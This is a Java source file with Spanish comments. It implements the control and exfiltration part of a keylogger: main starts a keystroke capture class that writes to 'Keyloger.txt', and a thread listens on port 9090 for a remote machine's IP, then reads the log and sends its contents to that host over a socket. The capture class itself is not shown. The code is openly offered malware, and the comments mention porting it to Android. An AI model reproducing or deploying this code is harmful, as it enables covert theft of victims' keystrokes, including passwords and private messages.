import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.swing.JOptionPane;

public class Principal implements Runnable{
	String IpAdressRemote;
	
	public Principal() {
		// iniciamos un hilo el cual llama al metodo run() 
		// pasar a android
		Thread hilo=new Thread(this); 
		hilo.start();
		//--------
	}

	public static void main(String[] args) {
		//creamos un objeto de la clase captura e instanciamos
		/*la clase captura es la que realiza la caputra de las pulsaciones*/
		Captura cap=new Captura("Keyloger.txt");
		
		
		
	}
	
	

	// pasar a android
	@Override
	public void run() {
		/* metodo (hilo) sobre escrito en el cual se queda en espera de una 
		maquina remota la cual mande su IP para posterior mente mandar
		el fichero generado */
		try {
			// se crea un serversocket pasa abrir un puerto como servido de la maquina			
			ServerSocket srvapp= new ServerSocket(9090);
			// se crea un socket que trae la maquina de desea conectarse
			Socket cli;
			
			
			while(true) // ciclo que no termina asta que la app se cierre
			{
				/* en espera de alguien se conecte*/
				cli= srvapp.accept();
				/*aca de asingana la informacion en bytes de la maquina remota */
				DataInputStream flujo=new DataInputStream(cli.getInputStream()); 
				// luego leo lo que me han enviado que es la IP o fin para terminar de escuchar .
				String msg=flujo.readUTF();
				//txtmensajes.append("\n"+cli.getInetAddress()+":"+msg);
				cli.close();
				if(msg.equalsIgnoreCase("fin"))
				{
					srvapp.close();
					break;
				}else if(msg.length()>3) // lo que trae es mayor que tres significa que viene la ip
				{
					IpAdressRemote=	msg.toString();
					SendDataRemote(IpAdressRemote); /*metodo que envia en fichero que contiene la info*/
				}
				
			}// fin while infinito.
			
			
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} // fin catch
		
		//-------------------------------------------------------------------------------------------
	}//fin hilo run()
	
	
	
	/* metodo encargado de leer el archivo y enviarlos a la maquina remota*/
	public void SendDataRemote(String IpAdress)
	{
		try {
				LeerFichero lee=new LeerFichero("Keyloger.txt");
				String texCaptur=lee.read();
				
				Socket cli=new Socket(IpAdress, 9090);
				DataOutputStream flujo=new DataOutputStream(cli.getOutputStream());
				flujo.writeUTF(texCaptur.toString());
				cli.close();
				
			} catch (Exception e) {

			//JOptionPane.showMessageDialog(null,"error en cliente"+e.getMessage());
			}

		
	}
	
}
